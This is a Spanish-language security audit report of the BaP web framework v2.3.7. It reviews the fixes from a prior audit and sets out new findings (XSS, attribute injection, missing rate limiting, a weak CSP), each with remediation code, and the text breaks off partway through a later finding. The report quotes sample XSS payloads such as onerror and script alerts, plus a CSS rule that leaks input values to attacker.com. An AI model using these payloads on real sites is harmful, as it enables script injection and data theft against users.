# 🔒 Informe de Auditoría de Seguridad — BaP Framework v2.3.7

> **Analista:** Auditoría automatizada de código fuente (white-box)
> **Fecha:** Junio 2026
> **Versión auditada:** `v2.3.7`
> **Alcance:** Análisis estático completo de todos los archivos fuente del framework
> **Repositorio:** `GonzaloArenasF/BaP_Framework`
> **Auditoría previa de referencia:** [`security-audit-v2.0.1.md`](./security-audit-v2.0.1.md)

---

## Resumen Ejecutivo

Este informe constituye la segunda auditoría de seguridad formal del framework, realizada sobre la versión `v2.3.7`. Se tomó como base el estado actual del código, considerando que las 15 vulnerabilidades identificadas en el audit previo (`v2.0.1`) fueron declaradas como corregidas en el log de correcciones (`security-fixes-v2.0.1.md`).

El análisis identificó **12 hallazgos nuevos** (incluyendo vulnerabilidades, debilidades de diseño y problemas de código) y verificó el estado real de las correcciones previas, encontrando **3 regresiones parciales o correcciones incompletas** que deben ser atendidas.

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 Crítica | 1 | Requiere acción inmediata |
| 🟠 Alta | 3 | Corrección prioritaria |
| 🟡 Media | 5 | Planificación a corto plazo |
| 🔵 Baja | 3 | Deuda técnica a gestionar |
| ⚠️ Regresión | 3 | Correcciones previas incompletas |

**Fortalezas mantenidas desde v2.0.1:**
- Sistema de inyección de credenciales en build-time (tokens `%%NOMBRE%%`) funcionando correctamente.
- Cabeceras de seguridad HTTP configuradas en `firebase.json` (CSP, X-Frame-Options, etc.).
- Motor de enrutamiento `router.js` con `URLSearchParams` y `setAttribute()` seguros.
- Cifrado AES-GCM / PBKDF2 implementado en `storage.js` (capa asíncrona).
- Validación de producción en Gulp que aborta el build si `FIREBASE_AVAILABLE=false`.
- Firebase App Check con reCAPTCHA Enterprise inicializado en `firebaseInit.js`.

---

## Arquitectura Analizada

```
BaP Framework v2.3.7
├── src/                              ← Código fuente (no desplegado directamente)
│   ├── _main/
│   │   ├── constants.js             ← IIFE de FIREBASE_AVAILABLE + tokens de build
│   │   ├── firebaseInit.js          ← Firebase init + App Check + logAnalyticEvent
│   │   ├── auth.js                  ← ⚠️ Whitelist solo verifica una vez (onValue)
│   │   ├── router.js                ← ✅ URLSearchParams + setAttribute seguro
│   │   ├── storage.js               ← ⚠️ Métodos síncronos deprecated aún exportados
│   │   ├── i18n.js                  ← ⚠️ sanitizeHTML incompleto + replaceTokensInDOM
│   │   ├── analytics.js             ← JSON.parse de token raw (riesgo si no compilado)
│   │   ├── routerPaths.js           ← JSON.parse de token raw (riesgo si no compilado)
│   │   └── util.js                  ← ⚠️ isMobile() via userAgent (spoofeable)
│   └── _components/
│       ├── bap-dialog/              ← ⚠️ img src sin validación de esquema
│       ├── bap-header/              ← ⚠️ colorMode inyectado sin sanitizar en preRender
│       ├── bap-notification/        ← ⚠️ template.innerHTML con element.innerHTML crudo
│       ├── bap-svg-image/           ← ⚠️ innerHTML sin sanitización en SVG paths
│       └── customComponentsRegistration.js ← fetch sin manejo de errores de red
├── gulpfile.js                      ← ✅ replaceEnvTokens con validación de producción
├── gulp-imports.js                  ← ✅ loadEnv() nativo
├── firebase.json                    ← ✅ CSP + cabeceras configuradas
├── bap.config.json                  ← ⚠️ loginAttempts=10 sin implementación real
└── .gitignore                       ← ✅ public/ excluida, .env excluido
```

---

## Estado de Correcciones Previas (v2.0.1)

A continuación se verifica el estado real de las 15 correcciones declaradas en `security-fixes-v2.0.1.md`.

| ID | Descripción | Estado declarado | Estado real |
|----|-------------|-----------------|-------------|
| VUL-01 | Credenciales hardcodeadas | ✅ Corregida | ✅ Verificada |
| VUL-02 | XSS via innerHTML masivo i18n | ✅ Corregida | ✅ Corregida en v2.3.7 (DOMPurify) |
| VUL-03 | XSS en bap-dialog via innerHTML | ✅ Corregida | ✅ Verificada |
| VUL-04 | Bypass FIREBASE_AVAILABLE | ✅ Corregida | ✅ Verificada |
| VUL-05 | Script Google Translate sin SRI | ✅ Corregida | ✅ Verificada |
| VUL-06 | Pseudo-cifrado Base64 en storage | ✅ Corregida | ✅ Aceptada con warning explícito (ver REG-02) |
| VUL-07 | Firebase SDK desactualizado | ✅ Corregida | ✅ Verificada (v10.11.0) |
| VUL-08 | Ausencia de cabeceras HTTP/CSP | ✅ Corregida | ✅ Verificada |
| VUL-09 | Query params parseados manualmente | ✅ Corregida | ✅ Verificada |
| VUL-10 | CORS abierto en servidor de dev | ✅ Corregida | ✅ Verificada |
| VUL-11 | UUID con Math.random() | ✅ Corregida | ✅ Verificada |
| VUL-12 | Source maps en bundle producción | ✅ Corregida | ✅ Verificada |
| VUL-13 | Operador lógico incorrecto analytics | ✅ Corregida | ✅ Verificada |
| VUL-14 | public/ versionada en Git | ✅ Corregida | ✅ Verificada |
| VUL-15 | Entornos expuestos en constants.js | ✅ Corregida | ✅ Aceptada como diseño intencional (ver REG-03) |

---

## Regresiones Detectadas en Correcciones Anteriores

---

### ✅ REG-01 — Sanitizador HTML reemplazado por DOMPurify (allowlist)

**Severidad:** 🟠 Alta → ✅ Corregida
**Archivos modificados:** `src/_main/i18n.js`, `firebase.json`
**Decisión:** Adoptar DOMPurify vía CDN como ES module.

#### Problema original
La función `sanitizeHTML()` usaba una estrategia blocklist incompleta que no cubría: SVG animado con event handlers (`onbegin`, `onload`), data URIs con contenido HTML/JS, meta refresh con `javascript:` scheme, `xlink:href` con payloads XSS, y técnicas de encoding evasion (`&#x6A;avascript:`, `\u006a`, etc.).

#### Solución aplicada

1. **`src/_main/i18n.js`:** Se importó DOMPurify como ES module desde jsDelivr (versión fijada `3.1.7`) y se reemplazó por completo la función `sanitizeHTML()`. La nueva implementación usa una estrategia **allowlist** que solo permite etiquetas y atributos HTML explícitamente seguros, rechazando cualquier vector no contemplado por diseño.

```javascript
import DOMPurify from "https://cdn.jsdelivr.net/npm/dompurify@3.1.7/dist/purify.es.mjs";

export function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "u", "strong", "em", "code", "pre", "a", "br", "p",
                   "ul", "ol", "li", "h2", "h3", "h4", "h5", "span", "div", "img", ...],
    ALLOWED_ATTR: ["href", "target", "rel", "class", "id", "alt", "src", ...],
    ALLOW_DATA_ATTR: false,
    FORCE_BODY: true,
    ADD_ATTR: ["target"],
  });
}
```

2. **`firebase.json`:** Se extendió la CSP para incluir `https://cdn.jsdelivr.net` en las directivas `script-src` y `connect-src`, permitiendo que el navegador cargue y ejecute el módulo ES de DOMPurify sin violaciones de política.

#### Trade-off aceptado
- **Supply chain:** jsDelivr es un CDN de alta confiabilidad. El riesgo es mitigado por la versión fijada (`@3.1.7`) y por el CSP que restringe los orígenes de scripts a dominios explícitamente listados. Para máxima seguridad futura se recomienda añadir SRI hash cuando el bundler permita calcularlo.
- **Cobertura:** A diferencia de la implementación blocklist previa, DOMPurify cubre todos los vectores XSS conocidos y es mantenido activamente por el equipo de Cure53.

---

### ✅ REG-02 — Warning en punto de llamada de funciones síncronas de storage (con `secretKey`)

**Severidad:** 🟡 Media → ✅ Aceptada con mejora de visibilidad
**Archivo modificado:** `src/_main/storage.js`
**Decisión:** Mantener la funcionalidad Base64 con `secretKey` (uso legítimo para control de formato visual, no cifrado), pero añadir `console.warn` explícito en el punto de llamada de las funciones síncronas.

#### Contexto de la decisión
El pseudo-cifrado Base64 en las funciones síncronas (`getFromStorage`, `setToStorage`, `updateStorage`) tiene un caso de uso legítimo: control del formato de texto almacenado (por ejemplo, preservar caracteres especiales o estructurar el payload). **No se eliminó** porque romper la API existente requeriría un bump de versión major. Sin embargo, el aviso `@deprecated` en `encryptData`/`decryptData` era invisible para los consumidores que llaman a las funciones de nivel superior.

#### Solución aplicada
Se añadió un `console.warn` explícito al inicio de la rama `secretKey` en las tres funciones síncronas (`getFromStorage`, `setToStorage`, `updateStorage`), indicando claramente en consola que:
- El comportamiento es **codificación Base64 visual**, no cifrado AES-GCM.
- La alternativa segura son las versiones `*Async` con cifrado real.

```javascript
// Ejemplo en setToStorage():
if (secretKey) {
  console.warn(
    "⚠️ [setToStorage] `secretKey` aplica codificación Base64 (formato visual). " +
    "NO es cifrado criptográfico seguro. Para cifrado AES-GCM usa `setToStorageAsync` con secretKey."
  );
}
```

Esto garantiza que cualquier uso de `secretKey` con la API síncrona produzca una advertencia en consola visible durante el desarrollo, sin romper la compatibilidad hacia atrás.

---

### ✅ REG-03 — `ENV_URL` usa `window.location.origin` en runtime (comportamiento intencional aceptado)

**Severidad:** 🔵 Baja → ✅ Aceptada como diseño intencional
**Archivo:** `src/_main/constants.js`
**Decisión:** No modificar. El comportamiento es intencional y correcto para la carga de assets de componentes.

#### Justificación
`ENV_URL` resuelve a `window.location.origin` en runtime para garantizar que las URLs de assets de componentes (`bap-header.css`, `bap-dialog.html`, etc.) sean siempre relativas al servidor desde el que se sirve la aplicación, independientemente del entorno. Cambiar esto a un token estático inyectado en build-time rompería el servidor de desarrollo cuando el origen local difiere del valor configurado en `.env`.

El riesgo documentado (URL de producción visible en bundle) es bajo: la URL de producción no es un secreto en el modelo de amenazas de una SPA pública.

**Acción:** Ninguna. Se documenta como comportamiento intencional.

---

## Hallazgos Nuevos

---

### 🔴 CRÍTICA — NEW-01: Inyección de HTML crudo en `bap-notification` via `element.innerHTML`

**Archivo:** `src/_components/bap-notification/bap-notification.js` — Líneas 66–73

**Descripción:**
El componente `bap-notification` obtiene el mensaje a mostrar directamente de `element.innerHTML` del host y lo inyecta sin sanitización en `template.innerHTML`:

```javascript
// bap-notification.js — createBapNotification()
const template = document.createElement("template");
template.innerHTML = setConfiguration(
  element.attributes.type ? element.attributes.type.value : null,
  element.attributes.severity ? element.attributes.severity.value : null,
  element.innerHTML,    // ← CRUDO, sin sanitizar
  html
);
shadow.appendChild(template.content.cloneNode(true));
```

La función `setConfiguration()` realiza `replaceAll` sobre la plantilla HTML con el mensaje directo:

```javascript
// setConfiguration()
elementWithValues = elementWithValues.replaceAll("{bap-notification-message}", message || "Sin mensaje");
```

Este mensaje (que puede contener HTML arbitrario) se inyecta directamente en `template.innerHTML` y luego en el Shadow DOM mediante `cloneNode(true)`. Aunque el Shadow DOM provee encapsulamiento de estilos, **no provee protección XSS** sobre el contenido inyectado vía `innerHTML`.

Y en `util.js`, la función `bapNotify()` que crea estas notificaciones asigna el mensaje con `textContent`:

```javascript
// util.js — bapNotify()
bapNotification.textContent = msg;  // ← textContent es seguro aquí
```

Sin embargo, la asignación de `textContent` al elemento custom establece `element.innerHTML` equivalente al texto escapado, pero si `bapNotify` es llamado con HTML (lo cual no se previene), el `textContent` lo escapa correctamente. **El riesgo real ocurre si algún otro código instancia `<bap-notification>` con innerHTML directamente**, como:

```html
<!-- Uso inseguro posible -->
<bap-notification type="toast" severity="info">
  <script>alert(1)</script>
</bap-notification>
```

O si un componente custom populara el innerHTML del elemento antes de conectarlo, lo cual es un patrón válido en Web Components.

**Impacto:**
- XSS dentro del Shadow DOM: aunque el Shadow DOM encapsula estilos, el JavaScript ejecutado dentro tiene acceso completo al `document` global.
- Cualquier extension de BaP que instancie `bap-notification` con contenido dinámico (no a través de `bapNotify`) está expuesta a XSS.

**Recomendación:**

1. **Inmediato:** Sanitizar `element.innerHTML` antes de pasarlo a `setConfiguration()`:
```javascript
// bap-notification.js
import { sanitizeHTML } from "../../_main/i18n.js"; // o usar DOMPurify

function createBapNotification(element) {
  const shadow = element.attachShadow({ mode: "open" });
  // ...
  fetch(componentPaths.html)
    .then(response => response.text())
    .then(html => {
      const template = document.createElement("template");
      const safeMessage = sanitizeHTML(element.innerHTML); // ← Sanitizar aquí
      template.innerHTML = setConfiguration(
        element.attributes.type?.value ?? null,
        element.attributes.severity?.value ?? null,
        safeMessage,   // ← Usar versión sanitizada
        html
      );
      shadow.appendChild(template.content.cloneNode(true));
    });
}
```

2. **Alternativa más segura:** Usar `textContent` en lugar de `innerHTML` para el mensaje, ya que las notificaciones raramente necesitan HTML rico:
```javascript
// setConfiguration() — Usar placeholder especial
function setConfiguration(type, severity, message, elementHTML) {
  // No insertar el mensaje en la plantilla, sino buscarlo post-render
  return elementHTML
    .replaceAll("{bap-notification-severity}", severity ? `severity-${severity}` : "severity-error")
    .replaceAll("{bap-notification-type}", type ? `type-${type}` : "type-toast");
}

// En createBapNotification, después del render:
const msgEl = shadow.querySelector(".notification-message");
if (msgEl) msgEl.textContent = element.innerHTML; // textContent escapa HTML automáticamente
```

---

### 🟠 ALTA — NEW-02: Inyección de HTML sin sanitización en `bap-svg-image` via `innerHTML`

**Archivo:** `src/_components/bap-svg-image/bap-svg-image.js` — Líneas 47–61

**Descripción:**
El componente `bap-svg-image` inyecta los paths SVG directamente en `innerHTML` sin ninguna sanitización:

```javascript
// bap-svg-image.js — connectedCallback()
this.innerHTML = `
  <figure style="width:${sizes[type][size].px}px; ...">
    <svg ...>
      ${images[type][name]}   // ← Contenido SVG inyectado directamente
    </svg>
  </figure>
`;
```

Donde `images[type][name]` proviene del módulo `icons.js`. Actualmente este módulo es estático y controlado por el desarrollador, por lo que el riesgo es bajo en el estado actual. Sin embargo:

1. Si `icons.js` fuera alimentado dinámicamente desde Firebase RTDB o cualquier fuente externa, el contenido SVG podría contener `<script>`, `<animate onbegin="...">` u otros vectores XSS vía SVG.
2. Los atributos `style` del `<figure>` interpolados con `sizes[type][size].px` son de fuente controlada, pero si el tamaño pudiera ser sobreescrito por un atributo del elemento, se abriría un vector de CSS injection.
3. El comentario `// Inyección limpia en el innerHTML en lugar de outerHTML` es engañoso: `innerHTML` con SVG externo **no es segura** sin sanitización.

**Impacto:**
- Si el mapa de iconos es ampliado por el consumidor del framework con SVGs de fuente externa (URL fetch, RTDB), se introduce XSS vía SVG animado.
- El patrón establece un precedente inseguro que puede ser replicado por otros componentes.

**Recomendación:**

1. **Validar** que el contenido de `images[type][name]` nunca proviene de fuentes dinámicas o externas.
2. **Sanitizar** el SVG antes de inyectarlo si el origen pudiera ser externo:
```javascript
// bap-svg-image.js
const sanitizedSvgContent = sanitizeHTML(images[type][name]);
this.innerHTML = `
  <figure ...>
    <svg ...>${sanitizedSvgContent}</svg>
  </figure>
`;
```
3. **Alternativa preferida:** Usar la API de DOM en lugar de innerHTML para construir el SVG:
```javascript
const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
svg.setAttribute("width", sizes[type][size].px);
// ... otros atributos
svg.innerHTML = sanitizeHTML(images[type][name]); // solo el path interior
```
4. Agregar un comentario JSDoc que documente que `icons.js` debe contener **únicamente contenido estático** controlado.

---

### 🟠 ALTA — NEW-03: Atributo `colorMode` inyectado sin sanitización en `bap-header` preRender

**Archivo:** `src/_components/bap-header/bap-header.js` — Líneas 13–18

**Descripción:**
La función `preRender` del componente `bap-header` inyecta el valor del atributo `color-mode` directamente en el template HTML sin ninguna validación ni sanitización:

```javascript
// bap-header.js — preRender()
function preRender(html, props) {
  return html
    .replaceAll("{color-mode}", props.colorMode)  // ← Sin sanitizar
    .replaceAll("{lightMode}", bapHeaderI18N.lightMode || "Light")
    .replaceAll("{darkMode}", bapHeaderI18N.darkMode || "Dark");
}
```

El valor `props.colorMode` se lee directamente del atributo HTML del elemento:

```javascript
// bap-header.js — connectedCallback()
colorMode: this.hasAttribute("color-mode") ? this.getAttribute("color-mode") : "light",
```

Si la plantilla `bap-header.html` usa `{color-mode}` en un contexto de atributo HTML (por ejemplo, `class="{color-mode}"` o `data-mode="{color-mode}"`), un valor como `" onclick="alert(1)` o `light" style="background:red` podría escapar el contexto del atributo e inyectar atributos o contenido HTML arbitrario en la plantilla antes de ser asignada a `template.innerHTML`.

**Impacto:**
- HTML Attribute Injection: un atacante que controle el atributo `color-mode` del elemento `<bap-header>` (a través de query params, RTDB u otro componente parent) puede inyectar atributos y potencialmente código en el componente.
- La plantilla HTML (`bap-header.html`) determina exactamente cuán explotable es esto, pero el patrón es inseguro por diseño.

**Recomendación:**

1. **Inmediato:** Validar `colorMode` contra una lista blanca de valores permitidos:
```javascript
// bap-header.js — connectedCallback()
const allowedModes = ["light", "dark"];
const rawMode = this.getAttribute("color-mode");
colorMode: allowedModes.includes(rawMode) ? rawMode : "light",
```

2. **Adicional:** Para todos los valores inyectados via `replaceAll()` en plantillas HTML, aplicar codificación HTML de atributos:
```javascript
// Función auxiliar de escape
function escapeAttr(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function preRender(html, props) {
  return html
    .replaceAll("{color-mode}", escapeAttr(props.colorMode))
    .replaceAll("{lightMode}", escapeAttr(bapHeaderI18N.lightMode || "Light"))
    .replaceAll("{darkMode}", escapeAttr(bapHeaderI18N.darkMode || "Dark"));
}
```

---

### 🟡 MEDIA — NEW-04: `bap-dialog` construye `<img>` con `src` no validado (SSRF de imagen / Open Redirect visual)

**Archivo:** `src/_components/bap-dialog/bap-dialog.js` — Líneas 26–28

**Descripción:**
El componente `bap-dialog` construye tags `<img>` con valores de atributos tomados directamente de los atributos del elemento, sin ninguna validación de esquema de URL:

```javascript
// bap-dialog.js — preRender()
const leftImg = props.imageHeaderLeft
  ? `<img src="${props.imageHeaderLeft}" alt="Encabezado Izquierdo" />`
  : "";
const rightImg = props.imageHeaderRight
  ? `<img src="${props.imageHeaderRight}" alt="Encabezado Derecho" />`
  : "";
const detailImg = props.imageDetail
  ? `<img class="bap-dialog-detail-img" src="${props.imageDetail}" alt="Detalle" />`
  : "";
```

Los valores son leídos directamente de atributos del elemento:

```javascript
imageHeaderLeft: this.getAttribute("image-header-left") || null,
imageHeaderRight: this.getAttribute("image-header-right") || null,
imageDetail: this.getAttribute("image-detail") || null,
```

**Problemas:**

1. **Ausencia de validación de esquema en `src`:** Una URL como `javascript:alert(1)` en el atributo `src` de una imagen puede ser explotada en algunos navegadores. Más preocupante, `data:text/html,...` como `src` puede funcionar en ciertos contextos.

2. **Inyección de atributos HTML:** Si `props.imageHeaderLeft` contiene `" onerror="alert(1)`, el string interpolado en el template resulta en `<img src="" onerror="alert(1)" ...>`, lo que constituye un XSS clásico.

3. **Tracking y filtrado de IP:** Una URL controlada externamente en el `src` de una imagen hace una solicitud HTTP al servidor del atacante, filtrando la IP del usuario.

**Impacto:**
- HTML Attribute Injection → XSS via `onerror`, `onload` u otros event handlers.
- Filtración de IP del usuario si las URLs provienen de contenido no confiable.

**Recomendación:**

1. **Validar el esquema de URL** antes de construir el tag `<img>`:
```javascript
function isSafeImageUrl(url) {
  if (!url) return false;
  try {
    const parsed = new URL(url, window.location.origin);
    return ["https:", "http:", "data:"].includes(parsed.protocol) &&
      !url.includes('"') && !url.includes("'") && !url.includes("<");
  } catch {
    // URLs relativas son seguras
    return !url.includes('"') && !url.includes("'") && !url.includes("<") && !url.includes("javascript:");
  }
}

// En preRender():
const safeLeft = isSafeImageUrl(props.imageHeaderLeft) ? props.imageHeaderLeft : "";
const leftImg = safeLeft ? `<img src="${safeLeft}" alt="Encabezado Izquierdo" />` : "";
```

2. **Usar DOM API en lugar de interpolación de strings:**
```javascript
// En postRender() o en un paso separado, construir los <img> con la API del DOM:
const img = document.createElement("img");
img.src = validatedUrl; // El navegador normaliza automáticamente URLs peligrosas
img.alt = "Encabezado Izquierdo";
container.appendChild(img);
```

---

### 🟡 MEDIA — NEW-05: `loginAttempts` configurado en `bap.config.json` pero sin implementación de rate limiting real

**Archivo:** `bap.config.json` — Línea 167 | `src/_main/constants.js` — Línea 61

**Descripción:**
El archivo de configuración define un límite de intentos de login:

```json
"security": {
  "loginAttempts": 10
}
```

Este valor es leído por `constants.js` y expuesto como `CONSTANT.AUTH.LOGIN_ATTEMPTS = 10`. Sin embargo, **no existe ningún código en el framework que implemente este límite**. No hay contador de intentos fallidos, ni bloqueo temporal, ni ningún mecanismo que haga uso de esta constante.

**Impacto:**
- La configuración `loginAttempts` crea una falsa expectativa de seguridad: un desarrollador puede asumir que el framework limita los intentos de login automáticamente, cuando en realidad no lo hace.
- Sin rate limiting, un atacante puede realizar intentos de login ilimitados (credential stuffing, fuerza bruta sobre cuentas de Google vinculadas al proyecto).
- Firebase Auth tiene sus propios límites de rate, pero son a nivel de proyecto completo, no por usuario/IP individual.

**Recomendación:**

1. **Implementar** un mecanismo de rate limiting en `auth.js`:
```javascript
// auth.js — Agregar contador de intentos
const loginAttemptTracker = {
  count: 0,
  lastAttemptTime: null,
  resetAfterMs: 15 * 60 * 1000, // 15 minutos

  canAttempt() {
    const now = Date.now();
    if (this.lastAttemptTime && (now - this.lastAttemptTime) > this.resetAfterMs) {
      this.count = 0; // Reset tras periodo de enfriamiento
    }
    return this.count < CONSTANT.AUTH.LOGIN_ATTEMPTS;
  },

  recordAttempt() {
    this.count++;
    this.lastAttemptTime = Date.now();
  }
};

export function userSignIn({ callbackOnSuccess, callbackOnFail }) {
  if (!CONSTANT.FIREBASE_AVAILABLE) { /* ... */ }

  if (!loginAttemptTracker.canAttempt()) {
    bapNotify(/* ... */, "Demasiados intentos de acceso. Espera 15 minutos.");
    if (callbackOnFail) callbackOnFail();
    return;
  }

  loginAttemptTracker.recordAttempt();
  signInWithPopup(bapAuth, new GoogleAuthProvider())
    .then(/* ... */);
}
```

2. **O eliminar** la configuración `loginAttempts` de `bap.config.json` si no se va a implementar, para evitar confusión.

3. **Documentar** claramente en el README que el rate limiting de autenticación depende de Firebase Auth (y sus límites de cuota).

---

### 🟡 MEDIA — NEW-06: `fetch()` de plantillas HTML de componentes sin manejo de errores de red ni timeout

**Archivo:** `src/_components/customComponentsRegistration.js` — Líneas 56–67

**Descripción:**
La función `createCustomComponent` usa `fetch()` para cargar las plantillas HTML de los componentes, pero no maneja errores de red ni implementa timeout:

```javascript
// customComponentsRegistration.js
if (htmlPath) {
  fetch(htmlPath)
    .then(response => response.text())
    .then(html => {
      const template = document.createElement("template");
      template.innerHTML = preRender ? preRender(html, props) : html;
      element.parentNode ? element.parentNode.appendChild(template.content.cloneNode(true)) : null;
      element.remove();
    })
    .finally(() => {
      postRender ? postRender(props) : null;
    });
  // ← Sin .catch()
}
```

**Problemas:**

1. **Sin `.catch()`:** Si el fetch falla (red caída, 404, CORS), la promesa se rechaza silenciosamente. El componente desaparece del DOM (`element.remove()` en el finally de postRender nunca es llamado) sin feedback al usuario.

2. **Sin validación de `response.ok`:** Si el servidor responde con 404 o 500, `response.text()` resuelve con el cuerpo de error HTML del servidor, que luego es inyectado en `template.innerHTML`. Esto puede introducir contenido del servidor de error (incluyendo mensajes con paths, nombres de archivo, etc.) en el DOM.

3. **Sin timeout:** Un servidor lento puede mantener el componente en estado de carga indefinido sin ninguna señal de error al usuario.

**Impacto:**
- Divulgación de información: el cuerpo de respuesta de un error 404/500 del servidor puede incluir paths del servidor, stack traces, o información de configuración.
- Degradación silenciosa: componentes que fallan al cargar desaparecen sin notificación, causando confusión al usuario.

**Recomendación:**

```javascript
// customComponentsRegistration.js — Fetch robusto
if (htmlPath) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout

  fetch(htmlPath, { signal: controller.signal })
    .then(response => {
      if (!response.ok) {
        throw new Error(`Error al cargar componente: HTTP ${response.status} para ${htmlPath}`);
      }
      return response.text();
    })
    .then(html => {
      clearTimeout(timeoutId);
      const template = document.createElement("template");
      template.innerHTML = preRender ? preRender(html, props) : html;
      if (element.parentNode) {
        element.parentNode.appendChild(template.content.cloneNode(true));
      }
      element.remove();
    })
    .catch(error => {
      clearTimeout(timeoutId);
      console.error(`createCustomComponent(): Error cargando ${htmlPath}`, error);
      // Opcional: renderizar un estado de error en el elemento
      element.textContent = "Error al cargar componente.";
    })
    .finally(() => {
      postRender ? postRender(props) : null;
    });
}
```

---

### 🟡 MEDIA — NEW-07: CSP en `firebase.json` incluye `'unsafe-inline'` para estilos

**Archivo:** `firebase.json` — Línea 44

**Descripción:**
La directiva CSP configurada incluye `'unsafe-inline'` en la directiva `style-src`:

```json
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com"
```

La directiva `'unsafe-inline'` para estilos permite la ejecución de:
- Atributos de estilo inline (`<element style="...">`)
- Elementos `<style>` en el HTML
- CSS inyectado via JavaScript (`element.style.cssText = ...`)

**Impacto:**
- CSS injection: si un atacante puede inyectar HTML con atributos `style`, puede usar CSS para exfiltrar datos, crear overlays de phishing, o manipular visualmente la interfaz (CSS-based UI redressing).
- Ejemplo de CSS injection para exfiltración:
```css
input[value^="a"] { background: url(https://attacker.com/a) }
input[value^="b"] { background: url(https://attacker.com/b) }
```
- Anula parcialmente la protección XSS del CSP, ya que CSS malicioso puede manipular el DOM visualmente para engañar usuarios.

**Recomendación:**

1. **Ideal:** Usar CSS `nonces` o hashes para permitir solo los estilos inline legítimos:
```json
"style-src 'self' 'nonce-{generado-por-servidor}' https://fonts.googleapis.com"
```
*(Requiere generación de nonce en el servidor, posible con Firebase App Hosting o Cloud Functions)*

2. **Pragmático (sin backend):** Auditar todos los usos de `style` inline en el código fuente y moverlos a clases CSS externas. Luego eliminar `'unsafe-inline'`:
```javascript
// En bap-svg-image.js — Mover estilos inline a clase CSS
// Antes:
this.innerHTML = `<figure style="width:${px}px; height:${px}px; display: flex; ...">`;
// Después:
this.innerHTML = `<figure class="bap-svg-figure" data-size="${size}">`;
// Con CSS: .bap-svg-figure[data-size="sm"] { width: 24px; height: 24px; }
```

3. **Mínimo:** Documentar el riesgo de `'unsafe-inline'` en el contexto de la aplicación específica.

---

### 🟡 MEDIA — NEW-08: Whitelist de usuarios en RTDB consultada con `onValue` suscripción permanente (memory leak potencial)

**Archivo:** `src/_main/auth.js` — Líneas 59–72

**Descripción:**
La función `isUserAuthorized()` usa `onValue` con `{ onlyOnce: true }` para consultar la whitelist, lo cual es correcto para la lectura única. Sin embargo, `sessionStartedControl()` invoca `isUserAuthorized()` dentro de `userSession.onAuthStateChanged()`, que es un listener permanente:

```javascript
// router.js — sessionStartedControl()
userSession.onAuthStateChanged(async (user) => {
  if (!user) {
    // redirect
  } else {
    const authorized = await isUserAuthorized(user);  // ← Una consulta RTDB por cada cambio de estado
    if (!authorized) {
      userSignOut({ ... });
    }
  }
});
```

**Problemas:**

1. **Listener no desuscrito:** El callback de `onAuthStateChanged` no se almacena en una variable para poder ser desuscrito con `unsubscribe()`. Si `sessionStartedControl()` es llamado múltiples veces (por rerenderings o navegaciones), se acumulan listeners activos.

2. **Consulta RTDB en cada cambio de estado de auth:** Cada vez que el estado de autenticación cambia (login, token refresh, etc.), se realiza una nueva consulta a Firebase RTDB. Esto genera tráfico innecesario y puede causar comportamientos inesperados si el token de acceso cambia durante la sesión.

3. **Carrera de condiciones (Race Condition):** Si el usuario se desconecta mientras `isUserAuthorized` está esperando la respuesta del RTDB, `signOut` puede ser llamado sobre un usuario ya desautenticado, generando errores silenciosos.

**Impacto:**
- Memory leak progresivo en aplicaciones con navegación de larga duración.
- Tráfico RTDB innecesario y costos de Firebase incrementados.
- Posibles errores de estado en la aplicación.

**Recomendación:**

1. **Guardar y limpiar el unsubscribe de `onAuthStateChanged`:**
```javascript
// router.js — sessionStartedControl()
let authUnsubscribe = null;

export function sessionStartedControl(route, initSession, redirectionCallbackOnNoSession) {
  // Limpiar listener previo si existe
  if (authUnsubscribe) {
    authUnsubscribe();
    authUnsubscribe = null;
  }

  if (route.validate?.signIn && CONSTANT.FIREBASE_AVAILABLE) {
    authUnsubscribe = userSession.onAuthStateChanged(async (user) => {
      if (!user) {
        // ...redirect
      } else {
        const authorized = await isUserAuthorized(user);
        if (!authorized) {
          authUnsubscribe(); // Limpiar antes de sign out
          userSignOut({ ... });
        }
      }
    });
  }
}
```

2. **Cachear el resultado de la whitelist** durante la sesión activa para evitar consultas repetidas al RTDB.

---

### 🔵 BAJA — NEW-09: `isMobile()` basado en `navigator.userAgent` (fácilmente falsificable)

**Archivo:** `src/_main/util.js` — Líneas 117–119

**Descripción:**
La función `isMobile()` determina si el dispositivo es móvil basándose en el User-Agent:

```javascript
export function isMobile() {
  return /Mobi|Android/i.test(navigator.userAgent);
}
```

`navigator.userAgent` puede ser modificado por el usuario (extensiones del navegador, DevTools, scripts) y no constituye una fuente confiable para decisiones de lógica de negocio.

**Impacto:**
- Baja en este contexto: `isMobile()` se usa en `bap-svg-image` para seleccionar el tamaño de ícono móvil, lo cual es una decisión puramente visual sin implicaciones de seguridad directas.
- Sin embargo, si esta función fuera usada en el futuro para decisiones de autorización o lógica de negocio crítica (por ejemplo, "mostrar funcionalidad admin solo en desktop"), la manipulación del UA permitiría eludir esa restricción.

**Recomendación:**

1. **Para decisiones visuales:** Usar CSS Media Queries o la API `window.matchMedia()` que no son manipulables por el usuario:
```javascript
export function isMobile() {
  return window.matchMedia("(max-width: 768px)").matches;
}
```

2. **Documentar** que esta función es solo para propósitos de UI/UX y **no debe usarse** para decisiones de seguridad o autorización.

---

### 🔵 BAJA — NEW-10: `paramsToQueryParams()` en `router.js` no codifica valores de query params (Open Redirect potencial)

**Archivo:** `src/_main/router.js` — Líneas 21–27

**Descripción:**
La función auxiliar `paramsToQueryParams()` construye una query string sin codificar los valores:

```javascript
// router.js
const paramsToQueryParams = (params) => {
  let arrayQueryParams = [];
  for (const name of Object.keys(params)) {
    arrayQueryParams.push(`${name}=${params[name]}`);  // ← Sin encodeURIComponent
  }
  return arrayQueryParams.join("&");
};
```

Si los valores de `params` contienen caracteres especiales como `&`, `=`, `#`, o URLs completas, la query string resultante puede malformarse o, en casos extremos, si la URL generada se usa en un redirect (`window.location.href = url`), puede facilitar Open Redirect si el valor contiene una URL absoluta con `//`.

**Impacto:**
- Query strings malformadas que puedan romper la navegación.
- Open Redirect potencial si `params` incluye una ruta que comience con `//` (protocol-relative URL).

**Recomendación:**

```javascript
const paramsToQueryParams = (params) => {
